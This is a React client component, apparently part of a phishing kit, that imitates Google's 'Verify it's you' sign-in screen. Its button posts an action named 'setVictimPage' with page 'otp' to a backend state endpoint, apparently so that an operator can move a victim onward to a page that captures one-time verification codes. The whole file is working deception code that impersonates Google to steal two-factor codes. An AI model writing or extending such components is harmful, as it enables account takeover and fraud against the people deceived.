"use client";

import { Button } from "@/components/ui/button";
import { Shield } from "lucide-react";

export default function VerifyStep() {
  const handleProceed = async () => {
     try {
      await fetch('/api/state', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'setVictimPage', page: 'otp' }),
      });
    } catch (error) {
       console.error('Failed to proceed');
    }
  };

  return (
    <div className="w-full text-center">
      <Shield className="mx-auto h-12 w-12 text-primary mb-4" />
      <h1 className="text-2xl font-normal">Verify it's you</h1>
      <p className="mt-4 text-sm text-muted-foreground">
        To help keep your account safe, Google wants to make sure it’s really you trying to sign in.
      </p>
      <p className="mt-4 text-sm text-muted-foreground">
        A code will be sent to your device.
      </p>

      <div className="mt-8">
        <Button onClick={handleProceed} className="w-full">
          Get Verification Code
        </Button>
      </div>
    </div>
  );
}
